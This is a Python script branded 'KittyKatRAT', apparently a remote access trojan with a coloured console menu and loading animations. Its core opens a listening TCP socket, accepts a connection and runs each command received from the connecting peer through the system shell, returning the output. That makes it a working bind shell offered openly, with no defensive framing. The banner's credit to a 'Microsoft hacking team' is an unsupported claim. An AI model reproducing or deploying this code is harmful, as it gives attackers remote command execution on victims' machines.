import socket
import subprocess
import pyfiglet
import time
import os
from colorama import init, Fore, Back, Style

# Inicjalizacja colorama
init(autoreset=True)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_kittykatrat():
    text = pyfiglet.figlet_format("KittyKatRAT", font="slant")
    print(Fore.LIGHTMAGENTA_EX + text)
    print(Style.RESET_ALL)
    print(Fore.BLUE + "Created by: Asher (michalfluffy) and Microsoft hacking team\n")
    print(Style.RESET_ALL)

def print_menu(title, options):
    print_kittykatrat()
    print(Fore.GREEN + Back.MAGENTA + "*" * 50)
    print(f"{' ' * 20}{Fore.GREEN + Back.MAGENTA + title}{Style.RESET_ALL}")
    print(Fore.GREEN + Back.MAGENTA + "*" * 50)
    for index, option in enumerate(options):
        if index % 2 == 0:
            print(Fore.GREEN + Back.MAGENTA + f"{index + 1}. {option}")
        else:
            print(Fore.MAGENTA + Back.GREEN + f"{index + 1}. {option}")
    print(Fore.GREEN + Back.MAGENTA + "*" * 50)

def handle_client_connection(client_socket):
    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == "exit":
            break
        else:
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())

    client_socket.close()

def loading_animation():
    for _ in range(5):
        for frame in r"-\|/":
            print("\rLoading " + frame, end="", flush=True)
            time.sleep(0.2)
    print("\rLoading Complete!")

def exiting_animation():
    print("Exiting", end="", flush=True)
    for _ in range(3):
        time.sleep(0.5)
        print(".", end="", flush=True)
    print("Goodbye!")

def main():
    clear_console()
    loading_animation()

    clear_console()
    print_menu("Main Menu", ["Start", "Exit"])

    choice = input(Fore.CYAN + "Enter your choice: ")
    print(Style.RESET_ALL)

    if choice == "1":
        ip = input("Enter IP address to listen on (default: 0.0.0.0): ") or '0.0.0.0'
        port = int(input("Enter port to listen on (default: 12345): ") or '12345')

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((ip, port))
        server_socket.listen(1)

        print(Fore.CYAN + f"[*] Listening on {ip}:{port}")
        print(Style.RESET_ALL)

        while True:
            client_socket, _ = server_socket.accept()
            print(Fore.YELLOW + f"[*] Accepted connection from {client_socket.getpeername()}")
            print(Style.RESET_ALL)

            clear_console()
            print_menu("Main Menu", ["Start", "Exit"])
            choice = input(Fore.CYAN + "Enter your choice: ")
            print(Style.RESET_ALL)

            client_socket.send(choice.encode())

            if choice.lower() == "exit":
                print(Fore.RED + "Exiting...")
                print(Style.RESET_ALL)
                exiting_animation()
                break

            handle_client_connection(client_socket)

        server_socket.close()
    elif choice == "2":
        print(Fore.RED + "Exiting...")
        print(Style.RESET_ALL)
        exiting_animation()
    else:
        print(Fore.RED + "Invalid choice. Please try again.")
        print(Style.RESET_ALL)

    print("Press Enter to exit...")
    input()  # Czekanie na naciśnięcie Enter

if __name__ == "__main__":
    main()
